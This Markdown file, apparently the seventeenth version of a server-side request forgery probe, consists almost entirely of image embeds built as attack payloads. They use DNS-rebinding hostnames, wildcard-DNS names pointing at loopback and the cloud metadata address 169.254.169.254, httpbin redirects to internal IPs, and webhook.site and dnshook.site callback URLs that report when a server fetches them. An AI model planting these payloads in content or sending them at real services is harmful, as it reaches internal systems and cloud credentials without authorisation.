# SSRF Test v17 - DNS Rebinding Attack

Testing DNS rebinding to bypass SSRF IP validation.

## Canary
![canary](https://webhook.site/dfbc6c96-897a-4072-8b74-71785e3bec8b/v17-canary.gif)

## 1. DNS Rebinding Services

### rbndr.us (alternating responses)
![rebind1](https://7f000001.c0a80001.rbndr.us/test.gif)
![rebind2](https://a9fe0101.ac100001.rbndr.us/test.gif)
![rebind3](https://7f000001.7f000001.rbndr.us/test.gif)

### rebind.network style
![rebind4](http://1time.169.254.169.254-2time.webhook.site.rebind.network/test.gif)

### nip.io with internal IP
![nip1](https://169-254-169-254.nip.io/latest/meta-data/)
![nip2](https://127-0-0-1.nip.io/test.gif)
![nip3](https://10-0-0-1.nip.io/test.gif)

### sslip.io with internal IP
![sslip1](https://127.0.0.1.sslip.io/test.gif)
![sslip2](https://169.254.169.254.sslip.io/test.gif)

### localtest.me (resolves to 127.0.0.1)
![local1](https://localtest.me/test.gif)
![local2](https://sub.localtest.me/test.gif)

### lvh.me (resolves to 127.0.0.1)
![lvh1](https://lvh.me/test.gif)
![lvh2](https://www.lvh.me/test.gif)

## 2. DNS Callback Verification
![dns1](https://dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)
![dns2](https://rebind-test.dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)

## 3. Time-Based Rebinding
These need multiple requests to trigger rebinding:

### First request (validation) returns safe IP
### Second request (actual fetch) returns internal IP
![time1](http://169.254.169.254.3s.dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)

## 4. Redirect-Based SSRF
Redirecting to internal IPs:
![redir1](https://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)
![redir2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
![redir3](https://httpbin.org/redirect-to?url=http://10.0.0.1/test.gif)

## 5. IPv6 Variants
![ipv6_local](https://webhook.site/dfbc6c96-897a-4072-8b74-71785e3bec8b/test.gif?host=[::1])

Version 17 - DNS Rebinding SSRF